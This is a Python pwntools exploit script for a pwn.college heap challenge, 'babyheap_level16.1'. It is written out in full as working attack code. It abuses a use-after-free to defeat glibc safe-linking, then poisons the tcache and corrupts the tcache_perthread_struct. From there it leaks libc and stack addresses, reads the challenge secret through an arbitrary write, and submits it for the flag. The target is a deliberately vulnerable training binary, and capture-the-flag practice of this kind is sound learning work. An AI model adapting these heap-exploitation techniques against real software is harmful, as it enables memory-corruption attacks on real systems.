from pwn import *
from time import sleep
context.binary=e=ELF("./babyheap_level16.1")
libc=e.libc
gs="""
set follow-fork-mode parent
b win
"""
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyheap_level16.1")
if args.DEBUG:
    context.log_level='debug'
def malloc(idx: int,size: int):
    p.sendlineafter(b"[*] Function",b"malloc")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.sendlineafter(b"Size: ",str(size).encode())
def free(idx: int):
    p.sendlineafter(b"[*] Function",b"free")
    p.sendlineafter(b"Index: ",str(idx).encode())
def puts(idx: int):
    p.sendlineafter(b"[*] Function",b"puts")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.recvuntil(b"Data: ")
    return p.recvuntil(b"\n").rstrip()
def scanf(idx: int,buffer: bytes):
    p.sendlineafter(b"[*] Function",b"scanf")
    p.sendlineafter(b"Index: ",str(idx).encode())
    #p.sendlineafter(f"allocations[{idx}])\n".encode(),buffer)
    p.sendline(buffer)
malloc(0,0x78)
free(0)
leaked1=puts(0)[::-1]
log.info("pos0 >> 12 = 0x{}".format(leaked1.hex()))
scanf(0,p64(0)*2)
free(0)
leaked2=puts(0)[::-1]
log.info("(pos0 >> 12) ^ pos0 = 0x{}".format(leaked2.hex()))
pos0= (int(leaked1.hex(),16)) ^ int(leaked2.hex(),16)
log.info(f"pos0 = {hex(pos0)}")
tcache_perthread_struct = pos0-0x290
scanf(0,p64((pos0 >> 12) ^ tcache_perthread_struct)+p64(0))
malloc(0,0x78)
malloc(1,0x78)
scanf(1,p16(7)*7+p16(0)*32+p16(7))
free(1)
leak3=puts(1)[:6][::-1]
libc.address=int(leak3.hex(),16)-0x219ce0
log.info(f"libc @ {hex(libc.address)}")
malloc(2,0xa8)
malloc(3,0xa8)
abs_got_puts=libc.address+0x219098
fs_base=libc.address-0x28c0
scanf(3,p64(libc.sym.environ))
malloc(4,0x78)
leak_stack=int(puts(4)[:6][::-1].hex(),16)
log.info(f"leak stack: {hex(leak_stack)}")
main_ret=leak_stack-288
ptr=main_ret-280
scanf(3,p64(ptr))
malloc(5,0x78)
scanf(5,p64(0x423580))
secret=puts(0)
p.sendlineafter(b"[*] Function",b"send_flag")
p.sendlineafter(b"Secret: ",secret)
p.interactive()